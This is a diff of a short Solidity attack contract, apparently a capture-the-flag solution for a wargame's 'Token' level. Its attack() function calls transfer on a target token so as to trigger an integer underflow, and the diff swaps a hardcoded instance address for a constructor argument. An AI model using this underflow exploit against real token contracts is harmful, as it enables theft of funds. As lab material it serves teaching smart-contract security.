@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.20;
 
 /**
  * @title 5. TOKEN
@@ -11,12 +11,14 @@ interface IToken {
 
 // Solidity versions below 0.8.0 are vulnerable to underflow/overflow attacks.
 contract UnsafeMath {
-    address constant tokenInstance = 0x813D92e2FCc7E453E161DDDFDE259369b6bF4294; // Replace with your CoinFlip instance
+    address immutable token;
+
+    constructor(address _token) {
+        token = _token;
+    }
 
     // This will transfer 1 tokens and trigger an underflow attack.
     function attack() public {
-        IToken(tokenInstance).transfer(msg.sender, 1);
+        IToken(token).transfer(msg.sender, 1);
     }
 }
-
-// 🎉 Level completed! 🎉
